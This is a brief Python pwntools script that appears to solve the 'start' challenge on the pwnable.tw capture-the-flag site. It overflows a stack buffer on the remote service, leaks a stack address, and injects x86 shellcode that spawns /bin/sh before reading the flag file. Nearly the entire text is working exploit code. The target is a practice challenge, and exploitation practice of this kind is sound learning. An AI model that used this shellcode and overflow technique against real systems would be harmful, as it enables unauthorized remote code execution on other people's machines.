from pwn import *
p=remote("chall.pwnable.tw",10000) 
shellcode = '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
first='i'*20+'\x87\x80\x04\x08'
p.recvuntil(':')
p.send(first)
add=u32(p.recv()[0:4])
second='i'*20+p32(add+0x14)+shellcode
p.sendline(second)
p.sendline('cd /home/start')
p.sendline('cat flag')
print p.recvline()
